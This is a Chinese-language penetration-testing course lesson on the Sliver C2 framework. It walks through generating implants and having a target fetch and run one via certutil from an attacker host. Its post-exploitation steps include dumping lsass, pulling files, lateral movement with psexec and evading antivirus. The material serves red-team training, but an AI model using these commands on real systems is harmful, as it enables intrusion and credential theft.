---
title: Day071：内网渗透 - C2 框架入门（Sliver）
tags:
  - 网络安全
  - 渗透测试
  - 内网渗透
categories:
  - 90天安全突击
stage: 实战演练
abbrlink: d0e83
date: 2026-01-28
updated: 2026-01-28
---

# Day071：内网渗透 - C2 框架入门（Sliver）

## 📋 基本信息

| 项目 | 内容 |
|------|------|
| **所属阶段** | 🏆 实战演练（第三阶段） |
| **所属周次** | Week 11-12：内网渗透基础 |
| **今日主题** | C2 框架入门（Sliver） |
| **预计时间** | 3-4 小时 |
| **难度等级** | ⭐⭐⭐⭐ 中高级 |

---

## 🔥 今日痛点场景

> **场景**：你通过各种方式拿到了多台机器的权限，但管理起来很混乱。每台机器都要单独连接，执行命令效率低下。
>
> **问题**：如何统一管理多个被控主机，高效执行后渗透操作？
>
> **今天的任务**：学习使用 C2（Command & Control）框架统一管理。

---

## 🎯 今日目标

- [ ] 理解 C2 框架的作用和架构
- [ ] 安装和配置 Sliver C2
- [ ] 生成并部署 Implant
- [ ] 通过 C2 执行后渗透操作

**闯关条件**：成功让目标机器上线 Sliver，并执行远程命令。

---

## ⚔️ 实战任务（先动手！）

### 任务 1：理解 C2 架构（20 分钟）

```
┌─────────────────────────────────────────────────────┐
│                    C2 Server (Kali)                  │
│                         │                            │
│    ┌────────────────────┼────────────────────┐       │
│    │                    │                    │       │
│    ▼                    ▼                    ▼       │
│ ┌──────┐           ┌──────┐           ┌──────┐      │
│ │目标1 │           │目标2 │           │目标3 │      │
│ │Implant│          │Implant│          │Implant│     │
│ └──────┘           └──────┘           └──────┘      │
└─────────────────────────────────────────────────────┘
```

**核心组件**：
- **Server**：控制端，管理所有会话
- **Implant**：植入物，运行在目标机器
- **Listener**：监听器，接收 Implant 连接

---

### 任务 2：安装 Sliver（30 分钟）

```bash
# 下载并安装 Sliver
curl https://sliver.sh/install | sudo bash

# 或手动下载
wget https://github.com/BishopFox/sliver/releases/latest/download/sliver-server_linux
chmod +x sliver-server_linux
sudo mv sliver-server_linux /usr/local/bin/sliver-server

# 启动 Sliver
sliver-server
```

**预期结果**：看到 Sliver 控制台界面。

---

### 任务 3：配置监听器和生成 Implant（40 分钟）

**启动 HTTP 监听器**：

```bash
sliver > http -l 8443
[*] Starting HTTP :8443 listener ...
```

**生成 Implant**：

```bash
# 生成 Windows Beacon
sliver > generate --http 192.168.1.100:8443 --os windows --arch amd64 --save /tmp/implant.exe

# 生成 Linux Implant
sliver > generate --http 192.168.1.100:8443 --os linux --arch amd64 --save /tmp/implant

# 使用 Session 模式（持久连接）
sliver > generate --mtls 192.168.1.100:8888 --os windows --save /tmp/implant_mtls.exe
```

---

### 任务 4：部署 Implant 并获取会话（30 分钟）

**传输 Implant 到目标**：

```bash
# 通过已有权限上传
proxychains4 impacket-smbclient CORP/admin@10.0.0.100
> put /tmp/implant.exe implant.exe

# 或通过 Web 服务下载
python3 -m http.server 80

# 目标机器执行
certutil -urlcache -split -f http://192.168.1.100/implant.exe C:\Windows\Temp\implant.exe
C:\Windows\Temp\implant.exe
```

**等待上线**：

```bash
sliver > sessions
 ID    Transport   Remote Address     Hostname   Username   OS
 ==    =========   ==============     ========   ========   ==
 1     http        10.0.0.100:54321   WORKPC     CORP\user  windows/amd64
```

---

### 任务 5：后渗透操作（40 分钟）

**进入会话**：

```bash
sliver > use 1
[*] Active session: XXXXXXXX

sliver (WORKPC) >
```

**基本命令**：

```bash
# 系统信息
sliver (WORKPC) > info
sliver (WORKPC) > whoami
sliver (WORKPC) > pwd

# 文件操作
sliver (WORKPC) > ls
sliver (WORKPC) > download C:\Users\user\Desktop\secret.txt
sliver (WORKPC) > upload /tmp/tool.exe C:\Windows\Temp\tool.exe

# 执行命令
sliver (WORKPC) > execute -o cmd.exe /c ipconfig
sliver (WORKPC) > shell  # 获取交互式 shell

# 进程操作
sliver (WORKPC) > ps
sliver (WORKPC) > procdump lsass.exe

# 横向移动
sliver (WORKPC) > psexec -t tcp 10.0.0.200 admin password
```

---

## ✅ 今日闯关检查

| 检查项 | 状态 |
|--------|------|
| Sliver 安装成功 | ⬜ |
| 监听器启动成功 | ⬜ |
| Implant 生成成功 | ⬜ |
| 目标成功上线 | ⬜ |
| 远程执行命令成功 | ⬜ |

---

## 📖 底层补课（做完实验再看）

### C2 框架对比

| 框架 | 类型 | 特点 |
|------|------|------|
| **Cobalt Strike** | 商业 | 功能最全，最流行 |
| **Sliver** | 开源 | 现代化，跨平台 |
| **Havoc** | 开源 | 类似 CS |
| **Metasploit** | 开源 | 经典，模块多 |

### Sliver 通信方式

| 协议 | 端口 | 隐蔽性 |
|------|------|--------|
| HTTP/S | 80/443 | 高 |
| mTLS | 自定义 | 中 |
| WireGuard | 自定义 | 高 |
| DNS | 53 | 极高 |

---

## ⚠️ 避坑指南

| 坑点 | 症状 | 解决方案 |
|------|------|----------|
| Implant 被杀 | 无法执行 | 使用免杀或加壳 |
| 上线失败 | 无会话 | 检查网络和监听器 |
| 会话断开 | 频繁掉线 | 调整心跳间隔 |

---

## 💡 知识卡片速查

### Sliver 常用命令

| 命令 | 作用 |
|------|------|
| `http` | 启动 HTTP 监听 |
| `generate` | 生成 Implant |
| `sessions` | 查看会话 |
| `use` | 进入会话 |
| `info` | 系统信息 |
| `execute` | 执行命令 |
| `download/upload` | 文件传输 |

---

## 🚀 明日预告

**Day 072：内网渗透 - 后渗透与权限维持**

明天你将：
- 学习各种权限维持技术
- 创建持久化后门
- 隐藏攻击痕迹

---

## 📊 学习记录（学习者填写）

| 项目 | 内容 |
|------|------|
| 实际学习日期 | ____年__月__日 |
| 实际用时 | ____ 小时 |
| 遇到的问题 | |
| 解决方法 | |
| 今日收获 | |
| 自评分数 | ⭐⭐⭐⭐⭐ (1-5星) |

---

> 💬 **导师点评**：
>
> C2 框架是专业红队的标配。手工操作效率太低，C2 让你事半功倍。
>
> Sliver 是开源界的明星，免费但功能不输商业产品。
>
> 记住：C2 只是工具，重要的是你的思路和技术。

```bash
echo "Day 071 Complete! C2 框架入门成功！"
```
